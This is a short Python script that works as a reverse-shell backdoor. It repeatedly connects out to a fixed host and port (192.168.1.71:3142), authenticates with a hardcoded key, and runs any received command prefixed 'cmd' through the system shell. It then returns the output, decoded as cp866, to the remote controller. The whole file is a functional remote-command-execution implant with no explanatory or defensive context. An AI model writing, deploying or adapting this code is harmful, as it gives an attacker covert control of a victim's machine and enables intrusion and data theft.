import subprocess
import socket
import time

key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
timeout = 60

host = '192.168.1.71'
port = 3142


def connect():
    try:
        print('Connecting...')
        client.connect((host, port))
        client.send(str.encode(key, 'utf-8'))
        print('Successful connected!')
    except socket.error:
        print(f'Connection refused. Reconnect in {timeout} seconds...')
        time.sleep(timeout)
        connect()


def disconnect():
    client.close()
    print('Connection closed')


while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()

    while True:
        msg = client.recv(1024)
        if len(msg) <= 0:
            break

        command = msg.decode('utf-8')

        if command.startswith('cmd'):
            proc = subprocess.Popen(command[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            proc.wait()

            client.send(bytes(stdout.decode('cp866'), 'utf-8'))

            if len(stdout) == 0:
                client.send(bytes(stderr.decode('cp866'), 'utf-8'))

    disconnect()
